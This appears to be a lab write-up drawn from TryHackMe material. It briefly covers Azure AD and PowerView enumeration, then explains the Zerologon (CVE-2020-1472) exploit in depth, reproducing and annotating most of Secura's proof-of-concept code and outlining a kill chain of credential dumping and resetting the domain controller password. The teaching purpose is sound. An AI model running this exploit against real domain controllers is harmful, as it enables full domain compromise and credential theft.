+<p>﻿﻿Recently there has been a shift in Active Directory pushing the companies to cloud networks for their companies. The most notable AD cloud provider is Azure AD. Its default settings are much more secure than an on-premise physical Active Directory network; however, the cloud AD may still have vulnerabilities in it.&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image250.png"></figure>
+<p><a href="https://icons8.com/icons/set/azure"><i>Azure Active Directory Icon by Icons8</i></a></p>
+<p>Azure AD Overview -&nbsp;</p>
+<p>﻿Azure acts as the middle man between your physical Active Directory and your users' sign on. This allows for a more secure transaction between domains, making a lot of Active Directory attacks ineffective.<br><br>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image252.png"></figure>
+<p>Cloud Security Overview -&nbsp;</p>
+<p>The best way to show you how the cloud takes security precautions past what is already provided with a physical network is to show you a comparison with a cloud Active Directory environment:&nbsp;</p>
+<figure class="table" style="width:80.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong><u>Windows Server AD</u></strong></td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt none #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;"><strong><u>Azure AD</u></strong></td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">LDAP</td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Rest APIs</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">NTLM</td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">OAuth/SAML</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Kerberos</td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">OpenID</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">OU Tree</td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Flat Structure</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Domains and Forests</td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Tenants</td>
+      </tr>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt none #DEE2E6;padding:.75pt;">Trusts</td>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:none;border-right:1.0pt solid #DEE2E6;border-top:none;padding:.75pt;">Guests</td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>This is only an overview of Active Directory in the cloud so we will&nbsp;not be going into detail of any of these protocols; however, I encourage you to go out and do your own research into these cloud protocols and how they are more secure than their physical counterparts, and if they themselves come with vulnerabilities.</p>
+<p>&nbsp;</p>
+<h2>Lab with powerview</h2>
+<p>PowerView Setup -&nbsp;</p>
+<p>﻿1.)&nbsp;<code>cd Downloads</code>&nbsp;- navigate to the directory PowerView is in</p>
+<p>2.)&nbsp;<code>powershell -ep bypass</code>&nbsp;- load a powershell shell with execution policy bypassed</p>
+<p>3.)&nbsp;<code>. .\PowerView.ps1</code>&nbsp;- import the PowerView module</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image254.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>Lab Overview -&nbsp;</p>
+<p>I will help you with a few commands the rest is up to you. Use the following cheatsheet&nbsp;<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">here</a>&nbsp;to find what you need. You should have enough knowledge of Active Directory now to investigate the machine's internals on your own.</p>
+<p>Example Commands:</p>
+<p><code>Get-NetComputer -fulldata | select operatingsystem</code>&nbsp;- gets a list of all operating systems on the domain</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image256.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p><code>Get-NetUser | select cn</code>&nbsp;- gets a list of all users on the domain</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image258.jpg" alt="Afbeelding met tekst
+
+Automatisch gegenereerde beschrijving"></figure>
+<p>You can find a cheatsheet for Powerview&nbsp;<a href="https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993">here</a>&nbsp;by HarmJ0y.</p>
+<p>Now you are on your own use the cheatsheet and hints to help you find the rest of the commands and get hands-on with Active&nbsp; Directory.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<h1>Zerologon</h1>
+<p>The purpose of this room is to shed light on the ZeroLogon vulnerability within an educational focus. This is done such that defenders can better understand the threat faced herein. The ZeroLogon vulnerability is approached from a "Proof of Concept" emphasis, providing a breakdown of the vulnerable method within this issue. TryHackMe does not condone illegal actions taken on the part of the individual.</p>
+<p>&nbsp;</p>
+<p><strong>Zero Logon - The Zero Day Angle</strong></p>
+<p>&nbsp;</p>
+<p><strong>About The vulnerability -&nbsp;</strong><br>On September 14, Secura released a whitepaper for CVE-2020-1472, that allowed an attacker to go from Zero to Domain Admin in approximately one minute. They dubbed this vulnerability Zero Logon.</p>
+<p>&nbsp;</p>
+<p>Zero Logon is a purely statistics based attack that abuses a feature within MS-NRPC (Microsoft NetLogon Remote Protocol), MS-NRPC is a critical authentication component of Active Directory that handles authentication for User and Machine accounts. In short -- the attack mainly focuses on a poor implementation of Cryptography. To be more specific, Microsoft chose to use AES-CFB8 for a function called ComputeNetlogonCredential, which is normally fine, except they had hard coded the Initialization Vector to use all zeros instead of a random string. When an attacker sends a message only containing zeros with the IV of zero, there is a 1-in-256 chance that the Ciphertext will be Zero.&nbsp;</p>
+<p>&nbsp;</p>
+<p>But how is that useful to us? We'll touch on that note in the following sections.</p>
+<p>&nbsp;</p>
+<p><strong>About Machine Accounts -</strong></p>
+<p>Normally, if we tried a statistics&nbsp;based attack on any user account, we would get locked out. This is not the case if we apply this principal to machine accounts. Machines accounts behave in a much different way than standard user accounts. They have no predefined account lockout attempts because a 64+ character alpha numeric password is normally used to secure them, making them very difficult to break into. They're not meant to be accessed by an end user by any means. In certain circumstances, we can dump the machine account password using a tool like Mimikatz, but if we're at that point, we've already compromised the machine -- and we're looking for persistence within the domain, not lateral movement.</p>
+<p>&nbsp;</p>
+<p><strong>Abusing the Vulnerability -&nbsp;</strong></p>
+<p>Machine accounts often hold system level privileges which we can use for a variety of things. If you're not familiar with Active Directory, we can take the Domain Controller's Machine Account and attempt to use the granted authentication in conjunction with Secretsdump.py (SecretsDump is a password dumping utility like Mimikatz, except it lives on the Network instead of the host) to dump all of the passwords within the domain. At this point we have a rough kill chain starting to form:</p>
+<p>&nbsp;</p>
+<p>Use Zero Logon to bypass authentication on the Domain Controller's Machine Account -&gt; Run Secretsdump.py to dump credentials -&gt; Crack/Pass Domain Admin Hashes -&gt; ??? -&gt; Profit</p>
+<p>&nbsp;</p>
+<p><strong>Analyzing the MS-NRPC Logon Process -&nbsp;</strong></p>
+<p>At this point, we know a vulnerability exists, but we're not quite sure how to exploit it yet. We'll be covering that soon, but what we do know there's a vulnerability within the way Microsoft handles Authentication within ComputeNetLogonCredetial function of MS-NRPC. To better understand the vulnerability, we need to do a bit of a deeper dive on how Microsoft handles authentication to NRPC.</p>
+<p>&nbsp;</p>
+<p>To analyze where the vulnerability occurs, we'll be using the Diagram provided by Secura as well as Microsoft Documentation to decipher the magic behind Zero Logon. The sources can be found at the bottom of this task.</p>
+<p>&nbsp;</p>
+<p>&nbsp;</p>
+<figure class="image"><img src="file:///C:/Users/morsmanr/AppData/Local/Temp/msohtmlclip1/01/clip_image260.jpg"></figure>
+<p>&nbsp;</p>
+<p><i>Source: Secura</i></p>
+<p>&nbsp;</p>
+<p><strong>Step 1</strong>. The client creates a NetrServerReqChallenge and sends it off&nbsp;<i>[Figure 1. Step 1]</i>.&nbsp;This contains the following values:</p>
+<p>&nbsp;</p>
+<p>1. The DC</p>
+<p>2. The Target Device (Also the DC, in our case)</p>
+<p>3. A Nonce (In our case is 16 Bytes of Zero).</p>
+<p>&nbsp;</p>
+<p><strong>Step 2</strong>. The server receives the NetrServerReqChallenge, the server will then generate it's own Nonce (This is called the Server Challenge), the server will send the Server Challenge back.&nbsp;<i>[Figure 1. Step 2]</i></p>
+<p>&nbsp;</p>
+<p><strong>Step 3</strong>. The client (us) will compute it's NetLogon Credentials with the Server Challenge provided&nbsp;<i>[Figure 1. Step 3]</i>. It uses the NetrServerAuthenticate3 method which requires the following parameters:</p>
+<p>&nbsp;</p>
+<p>1. A Custom Binding Handle (Impacket handles this for us, it's negotiated prior)</p>
+<p>2. An Account Name (The Domain Controller's machine account name. ex: DC01$)</p>
+<p>3. A Secure Channel Type (Impacket sort of handles this for us, but we still need to specify it: [nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel])</p>
+<p>4. The Computer Name (The Domain Controller ex: DC01)</p>
+<p>5. The Client Credential String (this will be 8 hextets of \x00 [16 Bytes of Zero])&nbsp;&nbsp;</p>
+<p>6. Negotiation Flags (The following value observed from a Win10 client with Sign/Seal flags disabled: 0x212fffff Provided by Secura)</p>
+<p>&nbsp;</p>
+<p><strong>Step 4</strong>. The server will receive the NetrServerAuthenticate request and will compute the same request itself using it's known, good values. If the results are good, the server will send the required info back to the client.&nbsp;<i>[Figure 1. Step 4.]</i></p>
+<p>&nbsp;</p>
+<p>At this point the attempt to exploit the Zero Logon vulnerability is under way. The above steps above will be looped through a certain number of times to attempt to exploit the Zero Logon vulnerability. The actual exploit occurs at Step 3 and 4, this where we're hoping for the Server to a have the same computations as the client.&nbsp;This is where are 1-in-256 chance comes in.</p>
+<p>&nbsp;</p>
+<p><strong>Step 5</strong>. If the server calculates the same value, the client will re-verify and once mutual agreement is confirmed, they will agree on a session key. The session key will be used to encrypt communications between the client and the server, which means authentication is successful.&nbsp;<i>[Figure 1. Step 5]</i></p>
+<p>&nbsp;</p>
+<p>From there, normal RPC communications can occur.</p>
+<p><strong>Sources -</strong></p>
+<p>1. Tom Tervoort of Secura - https://www.secura.com/pathtoimg.php?id=2055</p>
+<p>1. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/7b9e31d1-670e-4fc5-ad54-9ffff50755f9</p>
+<p>2. Microsoft - https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9</p>
+<p>&nbsp;</p>
+<p><strong>Impacket Installation</strong></p>
+<p>Git Clone Impacket -</p>
+<p>As a prior warning, Impacket can be quite fussy when it comes to some modules within nrpc.py, because of this, we recommend using the TryHackMe&nbsp;<a href="https://tryhackme.com/my-machine"><strong>Attack Box</strong></a>. This will make the exploit run faster, additionally, we can attempt to provide better support via the&nbsp;<a href="https://tryhackme.com/my-machine"><strong>Attack Box</strong></a>. Additionally, we are going to be using a Virtual Environment to Install Impacket.&nbsp;The instructions to install Impacket are as follows:</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp;</p>
+          <p>python3 -m pip install virtualenv</p>
+          <p>python3 -m virtualenv impacketEnv</p>
+          <p>source impacketEnv/bin/activate</p>
+          <p>pip install git+https://github.com/SecureAuthCorp/impacket</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>After executing these commands, you should be placed within a Python3 Virtual Environment that will be compatible to modify the&nbsp;PoC&nbsp;to exploit Zero Logon.</p>
+<p>&nbsp;</p>
+<p>﻿﻿Modifying and Weaponizing the&nbsp;PoC</p>
+<p>PoC&nbsp;and You -&nbsp;</p>
+<p>Proof of Concepts are incredibly important to every exploit, without them, the exploit's are almost entirely theoretical. Fortunately, Secura was able to provide a working&nbsp;<a href="https://github.com/SecuraBV/CVE-2020-1472">Proof of Concept for Zero Logon</a>&nbsp;that was 90% of the way there. We simply need to make an additional call to change the password to a null value, recall Figure 3 from Task 1, Secura was even kind enough to give us the method that we need to call (<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">NetrServerPasswordSet2</a>). Looking up the method within the Microsoft Documentation, it's very similar to&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">hNetSeverAuthenticate3</a>, so we're going to re-use some of the same variables from that, as well as the structure.</p>
+<p>&nbsp;</p>
+<p>Analyzing the&nbsp;PoC&nbsp;-&nbsp;</p>
+<p>Before we continue any further, you should download the&nbsp;PoC&nbsp;from Secura, which can be found here:</p>
+<p><a href="https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py">https://raw.githubusercontent.com/SecuraBV/CVE-2020-1472/master/zerologon_tester.py</a></p>
+<p>The script may seem quite daunting at first, but it's quite simple, if you think back to Figure 1 from Task 1, you'll quickly see how it all starts to fit together. Let's start by breaking the&nbsp;PoC&nbsp;down. We're going to be this in order of execution/importance so it's easier to digest:</p>
+<p>&nbsp;</p>
+<p>Lines 3 - 13</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>from impacket.dcerpc.v5 import nrpc, epm</p>
+          <p>from impacket.dcerpc.v5.dtypes import NULL</p>
+          <p>from impacket.dcerpc.v5 import transport</p>
+          <p>from impacket import crypto</p>
+          <p>&nbsp;</p>
+          <p>import hmac, hashlib, struct, sys, socket, time</p>
+          <p>from binascii import hexlify, unhexlify</p>
+          <p>from subprocess import check_call</p>
+          <p>MAX_ATTEMPTS = 2000</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>&nbsp;</p>
+<p>Lines 1-4 import the required modules from Impacket, specifically the NRPC, EPM, Crypto, and Transport libraries. Additionally, on lines 6-8 a handful of other misc libraries are also imported, however, the Impacket libraries are the star of the show here. Lastly, on line 9, we're defining a constant (similar to a variable, but never changes) that sets the maximum number of retries for Zero Logon to 2000.</p>
+<p>&nbsp;</p>
+<p>Lines 76 - 86</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>if __name__ == '__main__':</p>
+          <p>&nbsp; if not (3 &lt;= len(sys.argv) &lt;= 4):</p>
+          <p>&nbsp; &nbsp; print('Usage: zerologon_tester.py &lt;dc-name&gt; &lt;dc-ip&gt;\n')</p>
+          <p>&nbsp; &nbsp; print('Tests whether a domain controller is vulnerable to the Zerologon attack.&nbsp;Does not attempt to make any changes.')</p>
+          <p>&nbsp; &nbsp; print('Note: dc-name should be the (NetBIOS) computer name of the domain controller.')</p>
+          <p>&nbsp; &nbsp; sys.exit(1)</p>
+          <p>&nbsp; else:</p>
+          <p>&nbsp; &nbsp; [_, dc_name, dc_ip] = sys.argv</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; &nbsp; dc_name = dc_name.rstrip('$')</p>
+          <p>&nbsp; &nbsp; perform_attack('\\\\' + dc_name, dc_ip, dc_name)</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>&nbsp;</p>
+<p>Next we skipped down to the very bottom of the script so some other variables will make sense later, Line 1 is essentially declaring a main function within Python, Line 2 we are checking for the amount of parameters, and ensuring that it's exactly 3 (zerologon_tester.py DCNAME IP). Lines 3-5 are printing the help menu only if it's greater than 3 arguments, or less than 2 and exiting. If the required arguments are supplied, on line 8 the arguments are being passed into two variables: dc_name, and dc_ip. After the arguments are passed, dc_name is being stripped of the "$" character, as the dc_name variable shouldn't have it. The user account name should however. Afterwards, it's passing the variables two variables and an additional, modified variable into a module called "perform_attack".</p>
+<p>&nbsp;</p>
+<p>Lines 57 - 73</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>def perform_attack(dc_handle, dc_ip, target_computer):</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; print('Performing authentication attempts...')</p>
+          <p>&nbsp; rpc_con = None</p>
+          <p>&nbsp; for attempt in range(0, MAX_ATTEMPTS):&nbsp;&nbsp;</p>
+          <p>&nbsp; &nbsp; rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)</p>
+          <p>&nbsp; &nbsp;&nbsp;</p>
+          <p>&nbsp; &nbsp; if rpc_con == None:</p>
+          <p>&nbsp; &nbsp; &nbsp; print('=', end='', flush=True)</p>
+          <p>&nbsp; &nbsp; else:</p>
+          <p>&nbsp; &nbsp; &nbsp; break</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; if rpc_con:</p>
+          <p>&nbsp; &nbsp; print('\nSuccess! DC can be fully compromised by a Zerologon attack.')</p>
+          <p>&nbsp; else:</p>
+          <p>&nbsp; &nbsp; print('\nAttack failed. Target is probably patched.')</p>
+          <p>&nbsp; &nbsp; sys.exit(1)</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>&nbsp;</p>
+<p>Line 1 is defining where the variables are being passed into for the local function, \\DCNAME is being passed into the dc_handle variable, dc_ip is being passed into dc_ip variable, and dc_name is being passed into the target_computer variable. All of which will be used later, or passed into different modules.</p>
+<p>&nbsp;</p>
+<p>Line 4 sets the variable rpc_con equal to none, this will be kept track of consistently to check and see if authentication is successful, if it's not, the script will continue until 2000 retries is hit. Line 5 is where the actual retries for Zero Logon occurs in the form of a for loop. Line 6 sets the rpc_con variable to the output of a different function called "try_zero_authenticate" with a couple of variables being passed to it, specifically dc_handle, dc_ip, and target_computer. All of which we addressed earlier. The next lines are simply checking if rpc_con is equal to a invalid login attempt, if it is, print =, if not, print success, if 2000 retries is hit: print attack failed.</p>
+<p>&nbsp;</p>
+<p>Lines 20-25</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>def try_zero_authenticate(dc_handle, dc_ip, target_computer):</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')</p>
+          <p>&nbsp; rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()</p>
+          <p>&nbsp; rpc_con.connect()</p>
+          <p>&nbsp; rpc_con.bind(nrpc.MSRPC_UUID_NRPC)</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>Line 1 is defining the try_zero_authenticate function and is taking the previously mentioned 3 variables as input, and is passing them into the function. Lines 3-6 are establishing a bind and a session with NRPC over TCP/IP so that we can communicate with the domain controller.</p>
+<p>&nbsp;</p>
+<p>Lines 27-40</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp; plaintext = b'\x00' * 8</p>
+          <p>&nbsp; ciphertext = b'\x00' * 8</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; flags = 0x212fffff</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)</p>
+          <p>&nbsp; try:</p>
+          <p>&nbsp; &nbsp; server_auth = nrpc.hNetrServerAuthenticate3(rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel,target_computer + '\x00', ciphertext, flags)</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>Line 1 and 2 are establishing two new variables, plaintext and ciphertext containing 16 Bytes of "\x00" which will be used to exploit the Zero Logon vulnerability. Line 4 contains a variable called Flags. These are the default flags observed from a Windows 10 Client (using AES-CFB8) with the Sign and Seal bit disabled (Source/Credit: Secura).</p>
+<p>&nbsp;</p>
+<p>Line 6 is where the fun beings -- This is where Step 1 beings in Figure 1, the client creates a NetrServerReqChallenge containing the following information required by the&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/5ad9db9f-7441-4ce5-8c7b-7b771e243d32">Microsoft Documentation</a>:</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp;NTSTATUS NetrServerReqChallenge(</p>
+          <p>&nbsp; &nbsp;[in, unique, string] LOGONSRV_HANDLE PrimaryName,</p>
+          <p>&nbsp; &nbsp;[in, string] wchar_t* ComputerName,</p>
+          <p>&nbsp; &nbsp;[in] PNETLOGON_CREDENTIAL ClientChallenge,</p>
+          <p>&nbsp;);</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>The Primary Name being the DC Handle, the Computer Name being the Target Computer, and the Client Challenge being 16 bytes of "\x00".&nbsp;</p>
+<p>&nbsp;</p>
+<p>And the client will receive back, which will be used in Figure 1, Step 2:</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>NTSTATUS NetrServerReqChallenge(</p>
+          <p>&nbsp; &nbsp;[out] PNETLOGON_CREDENTIAL ServerChallenge</p>
+          <p>&nbsp;);</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>Lines 8 sets up a try except (we'll see the rest of that in the next few lines), but in line 9 is where we actually attempt to exploit the Zero Logon vulnerability, this would be Figure 1, Step 3. This section requires a fair bit more information, per the Microsoft Documentation for&nbsp;<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/3a9ed16f-8014-45ae-80af-c0ecb06e2db9">NetrServerAuthenticate3</a>, the following is required:&nbsp;</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>NTSTATUS NetrServerAuthenticate3(</p>
+          <p>&nbsp; &nbsp;[in, unique, string] LOGONSRV_HANDLE PrimaryName,</p>
+          <p>&nbsp; &nbsp;[in, string] wchar_t* AccountName,</p>
+          <p>&nbsp; &nbsp;[in] NETLOGON_SECURE_CHANNEL_TYPE SecureChannelType,</p>
+          <p>&nbsp; &nbsp;[in, string] wchar_t* ComputerName,</p>
+          <p>&nbsp; &nbsp;[in] PNETLOGON_CREDENTIAL ClientCredential,</p>
+          <p>&nbsp; &nbsp;[in, out] ULONG * NegotiateFlags,</p>
+          <p>&nbsp;);</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>On line 9, we supply the DC_Handle as the Primary Name, the Target Computer plus a $ as the Machine Account Name (Recall, Machine accounts do not have lockout policies), the Secure Channel Type as the Secure Channel Type previously established over RPC, the target_computer variable as the ComputerName, the Ciphertext (16 bytes of "\x00" attempting to Abuse Zero Logon, remember there's 1-in-256 chance that the Ciphertext will be the same as the plaintext), and lastly, our flags variable that mimics those of a Windows 10 client machine.</p>
+<figure class="table" style="width:873.0pt;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp;NTSTATUS NetrServerAuthenticate3(</p>
+          <p>&nbsp; &nbsp;[out] PNETLOGON_CREDENTIAL ServerCredential,</p>
+          <p>&nbsp; &nbsp;[in, out] ULONG * NegotiateFlags,</p>
+          <p>&nbsp; &nbsp;[out] ULONG * AccountRid</p>
+          <p>&nbsp;);</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p><br>Additionally, we expect to receive two (possibly 3) things back from the Server upon (hopefully) successful exploitation of Zero Logon: The ServerCredential and AccountRid, only one of which we are going to use.</p>
+<p>&nbsp;</p>
+<p>&nbsp;Line 44 - 54</p>
+<figure class="table" style="width:100.0%;">
+  <table style="background-color:white;border-bottom:none;border-left:none;border-right:none;border-top:none;">
+    <tbody>
+      <tr>
+        <td style="border-bottom:1.0pt solid #DEE2E6;border-left:1.0pt solid #DEE2E6;border-right:1.0pt solid #DEE2E6;border-top:1.0pt solid #DEE2E6;padding:.75pt;">
+          <p>&nbsp; &nbsp; assert server_auth['ErrorCode'] == 0</p>
+          <p>&nbsp; &nbsp; return rpc_con</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; except nrpc.DCERPCSessionError as ex:</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; &nbsp; if ex.get_error_code() == 0xc0000022:</p>
+          <p>&nbsp; &nbsp; &nbsp; return None</p>
+          <p>&nbsp; &nbsp; else:</p>
+          <p>&nbsp; &nbsp; &nbsp; fail(f'Unexpected error code from DC: {ex.get_error_code()}.')</p>
+          <p>&nbsp;</p>
+          <p>&nbsp; except BaseException as ex:</p>
+          <p>&nbsp; &nbsp; fail(f'Unexpected error: {ex}.')</p>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+</figure>
+<p>&nbsp;</p>
+<p>Line 1 is retrieving the Error Code from the Server_auth variable, or the variable assigned to establish an Authentication Session with the target device. If successful, we're going to return the rpc_con variable which will inform us that we have successfully bypassed Authentication with Zero Logon. Lines 3-12 are simply Error handling lines so the program doesn't break and exit after receiving an error back.</p>
+<p>&nbsp;</p>
+<p>End of Transmission, What's Next? -&nbsp;</p>
+<p>And that's all there is to the Proof of Concept. It's not some giant, scary monster. It even successfully exploit the Zero Logon vulnerability for us -- but it stops and doesn't do anything further, so how do we proceed?</p>
+<p>&nbsp;</p>
+<p>Good question, next we need to take a look at the Microsoft Documentation itself and see what we can do to interact with NRPC Itself. If you're not familiar with NRPC, and you're not that technical of an individual, look back at the last step in Task 1, Figure 3 (hint: It tells us what we need to do).</p>
+<p>&nbsp;</p>
+<p>What's It All Mean, Doc? -&nbsp;</p>
+<p>After going back and peaking at Figure 3 on Task 1, or researching how to reset a password over RDP, you should have came across the following document:</p>
+<p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81</a></p>
